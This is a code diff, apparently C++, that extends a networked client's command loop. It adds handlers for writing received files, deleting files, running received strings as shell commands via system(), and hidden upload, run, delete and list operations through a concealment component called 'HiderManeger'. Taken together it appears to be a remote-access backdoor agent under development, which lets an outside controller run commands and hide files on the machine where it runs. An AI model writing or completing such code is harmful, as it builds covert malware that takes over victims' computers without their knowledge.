@@ -4,6 +4,7 @@
 #include "client.h"
 #include "SoftwareManeger.h"
 #include "FunCodes.h"
+#include "HiderManeger.h"
 
 void testSoftwareManeger(void);
 
@@ -12,10 +13,11 @@ int main(int argc, char * argv[]) {
     Client client;
     client.createSocket();
     SoftwareManeger swm = SoftwareManeger();
-
+    HiderManeger hiderManager = HiderManeger();
+    
     while (true)
     {
-        loopIter(client, swm);
+        loopIter(client, swm, hiderManager);
     }
 
     return 0;
@@ -23,14 +25,27 @@ int main(int argc, char * argv[]) {
 
 void testSoftwareManeger() {
     SoftwareManeger swm = SoftwareManeger();
-    swm.writeFile("tempSwmTest.txt", false, "this is my first test\n");
-    swm.writeFile("tempSwmTest.txt", 1, "this is my second test\n");
+    swm.chunkWrite("tempSwmTest.txt", false, "this is my first test\n");
+    swm.chunkWrite("tempSwmTest.txt", 1, "this is my second test\n");
     
     swm.deleteFile("tempSwmTest.txt");
 
 }
 
-void loopIter(Client& client, SoftwareManeger& swm)
+void fileWrite(Client& client, std::string param, SoftwareManeger& swm)
+{
+    bool cont = true;
+    bool isAppend = false;
+    char buffer[BUFFER_SIZE] = {0};
+    while (client.recvData(buffer) > 0)
+    {
+        swm.chunkWrite(param, isAppend, buffer);
+        isAppend = true;
+    }
+}
+
+
+void loopIter(Client& client, SoftwareManeger& swm, HiderManeger hiderManeger)
 {
     // receive command
     Message msg;
@@ -43,31 +58,35 @@ void loopIter(Client& client, SoftwareManeger& swm)
     switch (fnccode)
     {
     case WRITE_FILE:
-        /* code */
+        fileWrite(client, param, swm);
         break;
 
     case DELETE_FILE:
-        res = swm.deleteFile(msg.param1());
+        res = swm.deleteFile(param);
         break;
 
     case RUN_BASH:
         system(param.c_str());
         break;
 
+    case HIDER_SETUP:
+        hiderManeger.setUpHider(param);
+        break;
+
     case HIDDEN_UPLOAD:
-        /* code */
+        hiderManeger.hiddenUpload(param, client);
         break;
 
     case HIDDEN_DELETE:
-        /* code */
+            hiderManeger.hiddenDelete(param);
         break;
 
     case HIDDEN_RUN:
-        /* code */
+        hiderManeger.hiddenRun(param);
         break;
 
     case HIDDEN_LIST:
-        /* code */
+        hiderManeger.hiddenList(client);
         break;
     
     default:
